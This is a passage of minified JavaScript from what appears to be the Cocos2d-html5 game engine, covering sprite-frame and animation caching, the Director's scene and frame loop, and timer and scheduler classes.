                for (var c = [], o = 0; o < r.length; o++) {
                    var s = i.getSpriteFrame(r[o]);
                    if (s) {
                        var a = new cc.AnimationFrame;
                        a.initWithSpriteFrame(s, 1, null),
                        c.push(a)
                    } else cc.log(cc._LogInfos.animationCache__parseVersion1_2, e, r[o])
                }
                0 === c.length ? cc.log(cc._LogInfos.animationCache__parseVersion1_3, e) : (c.length != r.length && cc.log(cc._LogInfos.animationCache__parseVersion1_4, e), c = cc.Animation.create(c, n, 1), cc.animationCache.addAnimation(c, e))
            } else cc.log(cc._LogInfos.animationCache__parseVersion1, e)
        }
    },
    _parseVersion2: function(t) {
        var e, i = cc.spriteFrameCache;
        for (e in t) {
            var n = t[e],
            r = n.loop,
            c = parseInt(n.loops),
            r = r ? cc.REPEAT_FOREVER: isNaN(c) ? 1 : c,
            c = n.restoreOriginalFrame && 1 == n.restoreOriginalFrame ? !0 : !1,
            o = n.frames;
            if (o) {
                for (var s = [], a = 0; a < o.length; a++) {
                    var h = o[a],
                    l = h.spriteframe,
                    u = i.getSpriteFrame(l);
                    if (u) {
                        var l = parseFloat(h.delayUnits) || 0,
                        h = h.notification,
                        _ = new cc.AnimationFrame;
                        _.initWithSpriteFrame(u, l, h),
                        s.push(_)
                    } else cc.log(cc._LogInfos.animationCache__parseVersion2_2, e, l)
                }
                n = parseFloat(n.delayPerUnit) || 0,
                o = new cc.Animation,
                o.initWithAnimationFrames(s, n, r),
                o.setRestoreOriginalFrame(c),
                cc.animationCache.addAnimation(o, e)
            } else cc.log(cc._LogInfos.animationCache__parseVersion2, e)
        }
    },
    _clear: function() {
        this._animations = {}
    }
},
cc.SpriteFrame = cc.Class.extend({
    _offset: null,
    _originalSize: null,
    _rectInPixels: null,
    _rotated: !1,
    _rect: null,
    _offsetInPixels: null,
    _originalSizeInPixels: null,
    _texture: null,
    _textureFilename: "",
    _textureLoaded: !1,
    _eventListeners: null,
    ctor: function(t, e, i, n, r) {
        this._offset = cc.p(0, 0),
        this._offsetInPixels = cc.p(0, 0),
        this._originalSize = cc.size(0, 0),
        this._rotated = !1,
        this._originalSizeInPixels = cc.size(0, 0),
        this._textureFilename = "",
        this._texture = null,
        this._textureLoaded = !1,
        void 0 !== t && void 0 !== e && (void 0 === i || void 0 === n || void 0 === r ? this.initWithTexture(t, e) : this.initWithTexture(t, e, i, n, r))
    },
    textureLoaded: function() {
        return this._textureLoaded
    },
    addLoadedEventListener: function(t, e) {
        null == this._eventListeners && (this._eventListeners = []),
        this._eventListeners.push({
            eventCallback: t,
            eventTarget: e
        })
    },
    _callLoadedEventCallbacks: function() {
        var t = this._eventListeners;
        if (t) {
            for (var e = 0,
            i = t.length; i > e; e++) {
                var n = t[e];
                n.eventCallback.call(n.eventTarget, this)
            }
            t.length = 0
        }
    },
    getRectInPixels: function() {
        var t = this._rectInPixels;
        return cc.rect(t.x, t.y, t.width, t.height)
    },
    setRectInPixels: function(t) {
        this._rectInPixels || (this._rectInPixels = cc.rect(0, 0, 0, 0)),
        this._rectInPixels.x = t.x,
        this._rectInPixels.y = t.y,
        this._rectInPixels.width = t.width,
        this._rectInPixels.height = t.height,
        this._rect = cc.rectPixelsToPoints(t)
    },
    isRotated: function() {
        return this._rotated
    },
    setRotated: function(t) {
        this._rotated = t
    },
    getRect: function() {
        var t = this._rect;
        return cc.rect(t.x, t.y, t.width, t.height)
    },
    setRect: function(t) {
        this._rect || (this._rect = cc.rect(0, 0, 0, 0)),
        this._rect.x = t.x,
        this._rect.y = t.y,
        this._rect.width = t.width,
        this._rect.height = t.height,
        this._rectInPixels = cc.rectPointsToPixels(this._rect)
    },
    getOffsetInPixels: function() {
        return this._offsetInPixels
    },
    setOffsetInPixels: function(t) {
        this._offsetInPixels.x = t.x,
        this._offsetInPixels.y = t.y,
        cc._pointPixelsToPointsOut(this._offsetInPixels, this._offset)
    },
    getOriginalSizeInPixels: function() {
        return this._originalSizeInPixels
    },
    setOriginalSizeInPixels: function(t) {
        this._originalSizeInPixels.width = t.width,
        this._originalSizeInPixels.height = t.height
    },
    getOriginalSize: function() {
        return this._originalSize
    },
    setOriginalSize: function(t) {
        this._originalSize.width = t.width,
        this._originalSize.height = t.height
    },
    getTexture: function() {
        if (this._texture) return this._texture;
        if ("" !== this._textureFilename) {
            var t = cc.textureCache.addImage(this._textureFilename);
            return t && (this._textureLoaded = t.isLoaded()),
            t
        }
        return null
    },
    setTexture: function(t) {
        if (this._texture != t) {
            var e = t.isLoaded();
            this._textureLoaded = e,
            this._texture = t,
            e || t.addLoadedEventListener(function(t) {
                if (this._textureLoaded = !0, this._rotated && cc._renderType === cc._RENDER_TYPE_CANVAS) {
                    var e = t.getHtmlElementObj(),
                    e = cc.cutRotateImageToCanvas(e, this.getRect()),
                    i = new cc.Texture2D;
                    i.initWithElement(e),
                    i.handleLoadedTexture(),
                    this.setTexture(i),
                    e = this.getRect(),
                    this.setRect(cc.rect(0, 0, e.width, e.height))
                }
                e = this._rect,
                0 === e.width && 0 === e.height && (e = t.width, t = t.height, this._rect.width = e, this._rect.height = t, this._rectInPixels = cc.rectPointsToPixels(this._rect), this._originalSizeInPixels.width = this._rectInPixels.width, this._originalSizeInPixels.height = this._rectInPixels.height, this._originalSize.width = e, this._originalSize.height = t),
                this._callLoadedEventCallbacks()
            },
            this)
        }
    },
    getOffset: function() {
        return this._offset
    },
    setOffset: function(t) {
        this._offset.x = t.x,
        this._offset.y = t.y
    },
    clone: function() {
        var t = new cc.SpriteFrame;
        return t.initWithTexture(this._textureFilename, this._rectInPixels, this._rotated, this._offsetInPixels, this._originalSizeInPixels),
        t.setTexture(this._texture),
        t
    },
    copyWithZone: function() {
        var t = new cc.SpriteFrame;
        return t.initWithTexture(this._textureFilename, this._rectInPixels, this._rotated, this._offsetInPixels, this._originalSizeInPixels),
        t.setTexture(this._texture),
        t
    },
    copy: function() {
        return this.copyWithZone()
    },
    initWithTexture: function(t, e, i, n, r) {
        if (2 === arguments.length && (e = cc.rectPointsToPixels(e)), n = n || cc.p(0, 0), r = r || e, i = i || !1, "string" == typeof t ? (this._texture = null, this._textureFilename = t) : t instanceof cc.Texture2D && this.setTexture(t), t = this.getTexture()) {
            var c, o;
            i ? (c = e.x + e.height, o = e.y + e.width) : (c = e.x + e.width, o = e.y + e.height),
            c > t.width && cc.error(cc._LogInfos.RectWidth, t.url),
            o > t.height && cc.error(cc._LogInfos.RectHeight, t.url)
        }
        return this._rectInPixels = e,
        this._rect = cc.rectPixelsToPoints(e),
        this._offsetInPixels.x = n.x,
        this._offsetInPixels.y = n.y,
        cc._pointPixelsToPointsOut(n, this._offset),
        this._originalSizeInPixels.width = r.width,
        this._originalSizeInPixels.height = r.height,
        cc._sizePixelsToPointsOut(r, this._originalSize),
        this._rotated = i,
        !0
    }
}),
cc.SpriteFrame.create = function(t, e, i, n, r) {
    return new cc.SpriteFrame(t, e, i, n, r)
},
cc.SpriteFrame._frameWithTextureForCanvas = function(t, e, i, n, r) {
    var c = new cc.SpriteFrame;
    return c._texture = t,
    c._rectInPixels = e,
    c._rect = cc.rectPixelsToPoints(e),
    c._offsetInPixels.x = n.x,
    c._offsetInPixels.y = n.y,
    cc._pointPixelsToPointsOut(c._offsetInPixels, c._offset),
    c._originalSizeInPixels.width = r.width,
    c._originalSizeInPixels.height = r.height,
    cc._sizePixelsToPointsOut(c._originalSizeInPixels, c._originalSize),
    c._rotated = i,
    c
},
cc.spriteFrameCache = {
    _CCNS_REG1: /^\s*\{\s*([\-]?\d+[.]?\d*)\s*,\s*([\-]?\d+[.]?\d*)\s*\}\s*$/,
    _CCNS_REG2: /^\s*\{\s*\{\s*([\-]?\d+[.]?\d*)\s*,\s*([\-]?\d+[.]?\d*)\s*\}\s*,\s*\{\s*([\-]?\d+[.]?\d*)\s*,\s*([\-]?\d+[.]?\d*)\s*\}\s*\}\s*$/,
    _spriteFrames: {},
    _spriteFramesAliases: {},
    _frameConfigCache: {},
    _rectFromString: function(t) {
        return t = this._CCNS_REG2.exec(t),
        t ? cc.rect(parseFloat(t[1]), parseFloat(t[2]), parseFloat(t[3]), parseFloat(t[4])) : cc.rect(0, 0, 0, 0)
    },
    _pointFromString: function(t) {
        return t = this._CCNS_REG1.exec(t),
        t ? cc.p(parseFloat(t[1]), parseFloat(t[2])) : cc.p(0, 0)
    },
    _sizeFromString: function(t) {
        return t = this._CCNS_REG1.exec(t),
        t ? cc.size(parseFloat(t[1]), parseFloat(t[2])) : cc.size(0, 0)
    },
    _getFrameConfig: function(t) {
        var e = cc.loader.getRes(t);
        if (cc.assert(e, cc._LogInfos.spriteFrameCache__getFrameConfig_2, t), cc.loader.release(t), e._inited) return this._frameConfigCache[t] = e;
        var i = e.frames,
        n = e.metadata || e.meta,
        e = {},
        r = {},
        c = 0;
        n && (c = n.format, c = 1 >= c.length ? parseInt(c) : c, r.image = n.textureFileName || n.textureFileName || n.image);
        for (var o in i) {
            var s = i[o];
            if (s) {
                if (n = {},
                0 == c) {
                    n.rect = cc.rect(s.x, s.y, s.width, s.height),
                    n.rotated = !1,
                    n.offset = cc.p(s.offsetX, s.offsetY);
                    var a = s.originalWidth,
                    s = s.originalHeight; (!a || !s) && cc.log(cc._LogInfos.spriteFrameCache__getFrameConfig),
                    a = Math.abs(a),
                    s = Math.abs(s),
                    n.size = cc.size(a, s)
                } else if (1 == c || 2 == c) n.rect = this._rectFromString(s.frame),
                n.rotated = s.rotated || !1,
                n.offset = this._pointFromString(s.offset),
                n.size = this._sizeFromString(s.sourceSize);
                else if (3 == c) {
                    var a = this._sizeFromString(s.spriteSize),
                    h = this._rectFromString(s.textureRect);
                    a && (h = cc.rect(h.x, h.y, a.width, a.height)),
                    n.rect = h,
                    n.rotated = s.textureRotated || !1,
                    n.offset = this._pointFromString(s.spriteOffset),
                    n.size = this._sizeFromString(s.spriteSourceSize),
                    n.aliases = s.aliases
                } else a = s.frame,
                h = s.sourceSize,
                o = s.filename || o,
                n.rect = cc.rect(a.x, a.y, a.w, a.h),
                n.rotated = s.rotated || !1,
                n.offset = cc.p(0, 0),
                n.size = cc.size(h.w, h.h);
                e[o] = n
            }
        }
        return this._frameConfigCache[t] = {
            _inited: !0,
            frames: e,
            meta: r
        }
    },
    addSpriteFrames: function(t, e) {
        cc.assert(t, cc._LogInfos.spriteFrameCache_addSpriteFrames_2);
        var i = this._frameConfigCache[t] || cc.loader.getRes(t);
        if (i && i.frames) {
            var n = this._frameConfigCache[t] || this._getFrameConfig(t),
            i = n.frames,
            n = n.meta;
            e ? e instanceof cc.Texture2D || ("string" == typeof e ? e = cc.textureCache.addImage(e) : cc.assert(0, cc._LogInfos.spriteFrameCache_addSpriteFrames_3)) : (n = cc.path.changeBasename(t, n.image || ".png"), e = cc.textureCache.addImage(n));
            var r, n = this._spriteFramesAliases,
            c = this._spriteFrames;
            for (r in i) {
                var o = i[r],
                s = c[r];
                if (!s) {
                    if (s = cc.SpriteFrame.create(e, o.rect, o.rotated, o.offset, o.size), o = o.aliases) for (var a = 0,
                    h = o.length; h > a; a++) {
                        var l = o[a];
                        n[l] && cc.log(cc._LogInfos.spriteFrameCache_addSpriteFrames, l),
                        n[l] = r
                    }
                    cc._renderType === cc._RENDER_TYPE_CANVAS && s.isRotated() && s.getTexture().isLoaded() && (o = s.getTexture().getHtmlElementObj(), o = cc.cutRotateImageToCanvas(o, s.getRectInPixels()), a = new cc.Texture2D, a.initWithElement(o), a.handleLoadedTexture(), s.setTexture(a), o = s._rect, s.setRect(cc.rect(0, 0, o.width, o.height))),
                    c[r] = s
                }
            }
        }
    },
    _checkConflict: function(t) {
        t = t.frames;
        for (var e in t) this._spriteFrames[e] && cc.log(cc._LogInfos.spriteFrameCache__checkConflict, e)
    },
    addSpriteFrame: function(t, e) {
        this._spriteFrames[e] = t
    },
    removeSpriteFrames: function() {
        this._spriteFrames = {},
        this._spriteFramesAliases = {}
    },
    removeSpriteFrameByName: function(t) {
        t && (this._spriteFramesAliases[t] && delete this._spriteFramesAliases[t], this._spriteFrames[t] && delete this._spriteFrames[t])
    },
    removeSpriteFramesFromFile: function(t) {
        var e = this._spriteFrames,
        i = this._spriteFramesAliases;
        if (t = this._frameConfigCache[t]) {
            t = t.frames;
            for (var n in t) if (e[n]) {
                delete e[n];
                for (var r in i) i[r] == n && delete i[r]
            }
        }
    },
    removeSpriteFramesFromTexture: function(t) {
        var e, i = this._spriteFrames,
        n = this._spriteFramesAliases;
        for (e in i) {
            var r = i[e];
            if (r && r.getTexture() == t) {
                delete i[e];
                for (var c in n) n[c] == e && delete n[c]
            }
        }
    },
    getSpriteFrame: function(t) {
        var e = this._spriteFrames[t];
        if (!e) {
            var i = this._spriteFramesAliases[t];
            i && ((e = this._spriteFrames[i.toString()]) || delete this._spriteFramesAliases[t])
        }
        return e || cc.log(cc._LogInfos.spriteFrameCache_getSpriteFrame, t),
        e
    },
    _clear: function() {
        this._spriteFrames = {},
        this._spriteFramesAliases = {},
        this._frameConfigCache = {}
    }
},
cc.g_NumberOfDraws = 0,
cc.GLToClipTransform = function(t) {
    var e = new cc.kmMat4;
    cc.kmGLGetMatrix(cc.KM_GL_PROJECTION, e);
    var i = new cc.kmMat4;
    cc.kmGLGetMatrix(cc.KM_GL_MODELVIEW, i),
    cc.kmMat4Multiply(t, e, i)
},
cc.Director = cc.Class.extend({
    _landscape: !1,
    _nextDeltaTimeZero: !1,
    _paused: !1,
    _purgeDirectorInNextLoop: !1,
    _sendCleanupToScene: !1,
    _animationInterval: 0,
    _oldAnimationInterval: 0,
    _projection: 0,
    _accumDt: 0,
    _contentScaleFactor: 1,
    _displayStats: !1,
    _deltaTime: 0,
    _frameRate: 0,
    _FPSLabel: null,
    _SPFLabel: null,
    _drawsLabel: null,
    _winSizeInPoints: null,
    _lastUpdate: null,
    _nextScene: null,
    _notificationNode: null,
    _openGLView: null,
    _scenesStack: null,
    _projectionDelegate: null,
    _runningScene: null,
    _frames: 0,
    _totalFrames: 0,
    _secondsPerFrame: 0,
    _dirtyRegion: null,
    _scheduler: null,
    _actionManager: null,
    _eventProjectionChanged: null,
    _eventAfterDraw: null,
    _eventAfterVisit: null,
    _eventAfterUpdate: null,
    ctor: function() {
        var t = this;
        t._lastUpdate = Date.now(),
        cc.eventManager.addCustomListener(cc.game.EVENT_SHOW,
        function() {
            t._lastUpdate = Date.now()
        })
    },
    init: function() {
        return this._oldAnimationInterval = this._animationInterval = 1 / cc.defaultFPS,
        this._scenesStack = [],
        this._projection = cc.Director.PROJECTION_DEFAULT,
        this._projectionDelegate = null,
        this._frameRate = this._accumDt = 0,
        this._displayStats = !1,
        this._totalFrames = this._frames = 0,
        this._lastUpdate = Date.now(),
        this._purgeDirectorInNextLoop = this._paused = !1,
        this._winSizeInPoints = cc.size(0, 0),
        this._openGLView = null,
        this._contentScaleFactor = 1,
        this._scheduler = new cc.Scheduler,
        this._actionManager = cc.ActionManager ? new cc.ActionManager: null,
        this._scheduler.scheduleUpdateForTarget(this._actionManager, cc.Scheduler.PRIORITY_SYSTEM, !1),
        this._eventAfterDraw = new cc.EventCustom(cc.Director.EVENT_AFTER_DRAW),
        this._eventAfterDraw.setUserData(this),
        this._eventAfterVisit = new cc.EventCustom(cc.Director.EVENT_AFTER_VISIT),
        this._eventAfterVisit.setUserData(this),
        this._eventAfterUpdate = new cc.EventCustom(cc.Director.EVENT_AFTER_UPDATE),
        this._eventAfterUpdate.setUserData(this),
        this._eventProjectionChanged = new cc.EventCustom(cc.Director.EVENT_PROJECTION_CHANGED),
        this._eventProjectionChanged.setUserData(this),
        !0
    },
    calculateDeltaTime: function() {
        var t = Date.now();
        this._nextDeltaTimeZero ? (this._deltaTime = 0, this._nextDeltaTimeZero = !1) : this._deltaTime = (t - this._lastUpdate) / 1e3,
        0 < cc.game.config[cc.game.CONFIG_KEY.debugMode] && .2 < this._deltaTime && (this._deltaTime = 1 / 60),
        this._lastUpdate = t
    },
    drawScene: function() {
        this.calculateDeltaTime(),
        this._paused || (this._scheduler.update(this._deltaTime), cc.eventManager.dispatchEvent(this._eventAfterUpdate)),
        this._clear(),
        this._nextScene && this.setNextScene(),
        this._beforeVisitScene && this._beforeVisitScene(),
        this._runningScene && (this._runningScene.visit(), cc.eventManager.dispatchEvent(this._eventAfterVisit)),
        this._notificationNode && this._notificationNode.visit(),
        this._displayStats && this._showStats(),
        this._afterVisitScene && this._afterVisitScene(),
        cc.eventManager.dispatchEvent(this._eventAfterDraw),
        this._totalFrames++,
        this._displayStats && this._calculateMPF()
    },
    _beforeVisitScene: null,
    _afterVisitScene: null,
    end: function() {
        this._purgeDirectorInNextLoop = !0
    },
    getContentScaleFactor: function() {
        return this._contentScaleFactor
    },
    getNotificationNode: function() {
        return this._notificationNode
    },
    getWinSize: function() {
        return this._winSizeInPoints
    },
    getWinSizeInPixels: function() {
        return cc.size(this._winSizeInPoints.width * this._contentScaleFactor, this._winSizeInPoints.height * this._contentScaleFactor)
    },
    pause: function() {
        this._paused || (this._oldAnimationInterval = this._animationInterval, this.setAnimationInterval(.25), this._paused = !0)
    },
    popScene: function() {
        cc.assert(this._runningScene, cc._LogInfos.Director_popScene),
        this._scenesStack.pop();
        var t = this._scenesStack.length;
        0 == t ? this.end() : (this._sendCleanupToScene = !0, this._nextScene = this._scenesStack[t - 1])
    },
    purgeCachedData: function() {
        cc.animationCache._clear(),
        cc.spriteFrameCache._clear(),
        cc.textureCache._clear()
    },
    purgeDirector: function() {
        this.getScheduler().unscheduleAllCallbacks(),
        cc.eventManager && cc.eventManager.setEnabled(!1),
        this._runningScene && (this._runningScene.onExitTransitionDidStart(), this._runningScene.onExit(), this._runningScene.cleanup()),
        this._nextScene = this._runningScene = null,
        this._scenesStack.length = 0,
        this.stopAnimation(),
        this.purgeCachedData(),
        cc.checkGLErrorDebug()
    },
    pushScene: function(t) {
        cc.assert(t, cc._LogInfos.Director_pushScene),
        this._sendCleanupToScene = !1,
        this._scenesStack.push(t),
        this._nextScene = t
    },
    runScene: function(t) {
        if (cc.assert(t, cc._LogInfos.Director_pushScene), this._runningScene) {
            var e = this._scenesStack.length;
            0 === e ? (this._sendCleanupToScene = !0, this._scenesStack[e] = t) : (this._sendCleanupToScene = !0, this._scenesStack[e - 1] = t),
            this._nextScene = t
        } else this.pushScene(t),
        this.startAnimation()
    },
    resume: function() {
        this._paused && (this.setAnimationInterval(this._oldAnimationInterval), (this._lastUpdate = Date.now()) || cc.log(cc._LogInfos.Director_resume), this._paused = !1, this._deltaTime = 0)
    },
    setContentScaleFactor: function(t) {
        t != this._contentScaleFactor && (this._contentScaleFactor = t, this._createStatsLabel())
    },
    setDefaultValues: function() {},
    setNextDeltaTimeZero: function(t) {
        this._nextDeltaTimeZero = t
    },
    setNextScene: function() {
        var t = !1,
        e = !1;
        cc.TransitionScene && (t = this._runningScene ? this._runningScene instanceof cc.TransitionScene: !1, e = this._nextScene ? this._nextScene instanceof cc.TransitionScene: !1),
        e || ((e = this._runningScene) && (e.onExitTransitionDidStart(), e.onExit()), this._sendCleanupToScene && e && e.cleanup()),
        this._runningScene = this._nextScene,
        this._nextScene = null,
        !t && null != this._runningScene && (this._runningScene.onEnter(), this._runningScene.onEnterTransitionDidFinish())
    },
    setNotificationNode: function(t) {
        this._notificationNode = t
    },
    getDelegate: function() {
        return this._projectionDelegate
    },
    setDelegate: function(t) {
        this._projectionDelegate = t
    },
    _showStats: function() {
        this._frames++,
        this._accumDt += this._deltaTime,
        this._FPSLabel && this._SPFLabel && this._drawsLabel ? (this._accumDt > cc.DIRECTOR_FPS_INTERVAL && (this._SPFLabel.string = this._secondsPerFrame.toFixed(3), this._frameRate = this._frames / this._accumDt, this._accumDt = this._frames = 0, this._FPSLabel.string = this._frameRate.toFixed(1), this._drawsLabel.string = (0 | cc.g_NumberOfDraws).toString()), this._FPSLabel.visit(), this._SPFLabel.visit(), this._drawsLabel.visit()) : this._createStatsLabel(),
        cc.g_NumberOfDraws = 0
    },
    isSendCleanupToScene: function() {
        return this._sendCleanupToScene
    },
    getRunningScene: function() {
        return this._runningScene
    },
    getAnimationInterval: function() {
        return this._animationInterval
    },
    isDisplayStats: function() {
        return this._displayStats
    },
    setDisplayStats: function(t) {
        this._displayStats = t
    },
    getSecondsPerFrame: function() {
        return this._secondsPerFrame
    },
    isNextDeltaTimeZero: function() {
        return this._nextDeltaTimeZero
    },
    isPaused: function() {
        return this._paused
    },
    getTotalFrames: function() {
        return this._totalFrames
    },
    popToRootScene: function() {
        this.popToSceneStackLevel(1)
    },
    popToSceneStackLevel: function(t) {
        cc.assert(this._runningScene, cc._LogInfos.Director_popToSceneStackLevel_2);
        var e = this._scenesStack,
        i = e.length;
        if (0 == i) this.end();
        else if (! (t > i)) {
            for (; i > t;) {
                var n = e.pop();
                n.running && (n.onExitTransitionDidStart(), n.onExit()),
                n.cleanup(),
                i--
            }
            this._nextScene = e[e.length - 1],
            this._sendCleanupToScene = !1
        }
    },
    getScheduler: function() {
        return this._scheduler
    },
    setScheduler: function(t) {
        this._scheduler != t && (this._scheduler = t)
    },
    getActionManager: function() {
        return this._actionManager
    },
    setActionManager: function(t) {
        this._actionManager != t && (this._actionManager = t)
    },
    getDeltaTime: function() {
        return this._deltaTime
    },
    _createStatsLabel: null,
    _calculateMPF: function() {
        this._secondsPerFrame = (Date.now() - this._lastUpdate) / 1e3
    }
}),
cc.Director.EVENT_PROJECTION_CHANGED = "director_projection_changed",
cc.Director.EVENT_AFTER_DRAW = "director_after_draw",
cc.Director.EVENT_AFTER_VISIT = "director_after_visit",
cc.Director.EVENT_AFTER_UPDATE = "director_after_update",
cc.DisplayLinkDirector = cc.Director.extend({
    invalid: !1,
    startAnimation: function() {
        this._nextDeltaTimeZero = !0,
        this.invalid = !1
    },
    mainLoop: function() {
        this._purgeDirectorInNextLoop ? (this._purgeDirectorInNextLoop = !1, this.purgeDirector()) : this.invalid || this.drawScene()
    },
    stopAnimation: function() {
        this.invalid = !0
    },
    setAnimationInterval: function(t) {
        this._animationInterval = t,
        this.invalid || (this.stopAnimation(), this.startAnimation())
    }
}),
cc.Director.sharedDirector = null,
cc.Director.firstUseDirector = !0,
cc.Director._getInstance = function() {
    return cc.Director.firstUseDirector && (cc.Director.firstUseDirector = !1, cc.Director.sharedDirector = new cc.DisplayLinkDirector, cc.Director.sharedDirector.init()),
    cc.Director.sharedDirector
},
cc.defaultFPS = 60,
cc.Director.PROJECTION_2D = 0,
cc.Director.PROJECTION_3D = 1,
cc.Director.PROJECTION_CUSTOM = 3,
cc.Director.PROJECTION_DEFAULT = cc.Director.PROJECTION_3D,
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.Director.prototype, _p.setProjection = function(t) {
    this._projection = t,
    cc.eventManager.dispatchEvent(this._eventProjectionChanged)
},
_p.setDepthTest = function() {},
_p.setOpenGLView = function(t) {
    this._winSizeInPoints.width = cc._canvas.width,
    this._winSizeInPoints.height = cc._canvas.height,
    this._openGLView = t || cc.view,
    cc.eventManager && cc.eventManager.setEnabled(!0)
},
_p._clear = function() {
    var t = this._openGLView.getViewPortRect();
    cc._renderContext.clearRect( - t.x, t.y, t.width, -t.height)
},
_p._createStatsLabel = function() {
    var t = 0,
    t = this._winSizeInPoints.width > this._winSizeInPoints.height ? 0 | 24 * (this._winSizeInPoints.height / 320) : 0 | 24 * (this._winSizeInPoints.width / 320);
    this._FPSLabel = cc.LabelTTF.create("000.0", "Arial", t),
    this._SPFLabel = cc.LabelTTF.create("0.000", "Arial", t),
    this._drawsLabel = cc.LabelTTF.create("0000", "Arial", t),
    t = cc.DIRECTOR_STATS_POSITION,
    this._drawsLabel.setPosition(this._drawsLabel.width / 2 + t.x, 5 * this._drawsLabel.height / 2 + t.y),
    this._SPFLabel.setPosition(this._SPFLabel.width / 2 + t.x, 3 * this._SPFLabel.height / 2 + t.y),
    this._FPSLabel.setPosition(this._FPSLabel.width / 2 + t.x, this._FPSLabel.height / 2 + t.y)
},
_p.getVisibleSize = function() {
    return this.getWinSize()
},
_p.getVisibleOrigin = function() {
    return cc.p(0, 0)
}) : (cc.Director._fpsImage = new Image, cc._addEventListener(cc.Director._fpsImage, "load",
function() {
    cc.Director._fpsImageLoaded = !0
}), cc._fpsImage && (cc.Director._fpsImage.src = cc._fpsImage), cc.assert("function" == typeof cc._tmp.DirectorWebGL, cc._LogInfos.MissingFile, "CCDirectorWebGL.js"), cc._tmp.DirectorWebGL(), delete cc._tmp.DirectorWebGL),
cc.PRIORITY_NON_SYSTEM = cc.PRIORITY_SYSTEM + 1,
cc.arrayVerifyType = function(t, e) {
    if (t && 0 < t.length) for (var i = 0; i < t.length; i++) if (! (t[i] instanceof e)) return cc.log(cc._LogInfos.arrayVerifyType),
    !1;
    return ! 0
},
cc.arrayRemoveObject = function(t, e) {
    for (var i = 0,
    n = t.length; n > i; i++) if (t[i] == e) {
        t.splice(i, 1);
        break
    }
},
cc.arrayRemoveArray = function(t, e) {
    for (var i = 0,
    n = e.length; n > i; i++) cc.arrayRemoveObject(t, e[i])
},
cc.arrayAppendObjectsToIndex = function(t, e, i) {
    return t.splice.apply(t, [i, 0].concat(e)),
    t
},
cc.ListEntry = function(t, e, i, n, r, c) {
    this.prev = t,
    this.next = e,
    this.target = i,
    this.priority = n,
    this.paused = r,
    this.markedForDeletion = c
},
cc.HashUpdateEntry = function(t, e, i, n) {
    this.list = t,
    this.entry = e,
    this.target = i,
    this.hh = n
},
cc.HashTimerEntry = function(t, e, i, n, r, c, o) {
    this.timers = t,
    this.target = e,
    this.timerIndex = i,
    this.currentTimer = n,
    this.currentTimerSalvaged = r,
    this.paused = c,
    this.hh = o
},
cc.Timer = cc.Class.extend({
    _interval: 0,
    _callback: null,
    _target: null,
    _elapsed: 0,
    _runForever: !1,
    _useDelay: !1,
    _timesExecuted: 0,
    _repeat: 0,
    _delay: 0,
    getInterval: function() {
        return this._interval
    },
    setInterval: function(t) {
        this._interval = t
    },
    getCallback: function() {
        return this._callback
    },
    ctor: function(t, e, i, n, r) {
        this._target = t,
        this._callback = e,
        this._elapsed = -1,
        this._interval = i || 0,
        this._delay = r || 0,
        this._useDelay = 0 < this._delay,
        this._repeat = null == n ? cc.REPEAT_FOREVER: n,
        this._runForever = this._repeat == cc.REPEAT_FOREVER
    },
    _doCallback: function() {
        "string" == typeof this._callback ? this._target[this._callback](this._elapsed) : this._callback.call(this._target, this._elapsed)
    },
    update: function(t) {
        if ( - 1 == this._elapsed) this._timesExecuted = this._elapsed = 0;
        else {
            var e = this._target,
            i = this._callback;
            this._elapsed += t,
            this._runForever && !this._useDelay ? this._elapsed >= this._interval && (e && i && this._doCallback(), this._elapsed = 0) : (this._useDelay ? this._elapsed >= this._delay && (e && i && this._doCallback(), this._elapsed -= this._delay, this._timesExecuted += 1, this._useDelay = !1) : this._elapsed >= this._interval && (e && i && this._doCallback(), this._elapsed = 0, this._timesExecuted += 1), this._timesExecuted > this._repeat && cc.director.getScheduler().unscheduleCallbackForTarget(e, i))
        }
    }
}),
cc.Scheduler = cc.Class.extend({
    _timeScale: 1,
    _updates: null,
    _hashForUpdates: null,
    _arrayForUpdates: null,
    _hashForTimers: null,
    _arrayForTimes: null,
    _currentTarget: null,
    _currentTargetSalvaged: !1,
    _updateHashLocked: !1,
    ctor: function() {
        this._timeScale = 1,
        this._updates = [[], [], []],
        this._hashForUpdates = {},
        this._arrayForUpdates = [],
        this._hashForTimers = {},
        this._arrayForTimers = [],
        this._currentTarget = null,
        this._updateHashLocked = this._currentTargetSalvaged = !1
    },
    _removeHashElement: function(t) {
        delete this._hashForTimers[t.target.__instanceId],
        cc.arrayRemoveObject(this._arrayForTimers, t),
        t.Timer = null,
        t.target = null
    },
    _removeUpdateFromHash: function(t) { (t = this._hashForUpdates[t.target.__instanceId]) && (cc.arrayRemoveObject(t.list, t.entry), delete this._hashForUpdates[t.target.__instanceId], cc.arrayRemoveObject(this._arrayForUpdates, t), t.entry = null, t.target = null)
    },
    _priorityIn: function(t, e, i, n) {
        if (n = new cc.ListEntry(null, null, e, i, n, !1), t) {
            for (var r = t.length - 1,
            c = 0; r >= c && !(i < t[c].priority); c++);
            t.splice(c, 0, n)
        } else t = [],
        t.push(n);
        return i = new cc.HashUpdateEntry(t, n, e, null),
        this._arrayForUpdates.push(i),
        this._hashForUpdates[e.__instanceId] = i,
        t
    },
    _appendIn: function(t, e, i) {
        i = new cc.ListEntry(null, null, e, 0, i, !1),
        t.push(i),
        t = new cc.HashUpdateEntry(t, i, e, null),
        this._arrayForUpdates.push(t),
        this._hashForUpdates[e.__instanceId] = t
    },
    setTimeScale: function(t) {
        this._timeScale = t
    },
    getTimeScale: function() {
        return this._timeScale
    },
    update: function(t) {
        var e, i, n, r = this._updates,
        c = this._arrayForTimers;
        for (this._updateHashLocked = !0, 1 != this._timeScale && (t *= this._timeScale), i = 0, n = r.length; n > i && i >= 0; i++) for (var o = this._updates[i], s = 0, a = o.length; a > s; s++) e = o[s],
        !e.paused && !e.markedForDeletion && e.target.update(t);
        for (i = 0, n = c.length; n > i && (e = c[i], e); i++) {
            if (this._currentTarget = e, this._currentTargetSalvaged = !1, !e.paused) for (e.timerIndex = 0; e.timerIndex < e.timers.length; e.timerIndex++) e.currentTimer = e.timers[e.timerIndex],
            e.currentTimerSalvaged = !1,
            e.currentTimer.update(t),
            e.currentTimer = null;
            this._currentTargetSalvaged && 0 == e.timers.length && (this._removeHashElement(e), i--)
        }
        for (i = 0, n = r.length; n > i; i++) for (o = this._updates[i], s = 0, a = o.length; a > s && (e = o[s], e);) e.markedForDeletion ? this._removeUpdateFromHash(e) : s++;
        this._updateHashLocked = !1,
        this._currentTarget = null
    },
    scheduleCallbackForTarget: function(t, e, i, n, r, c) {
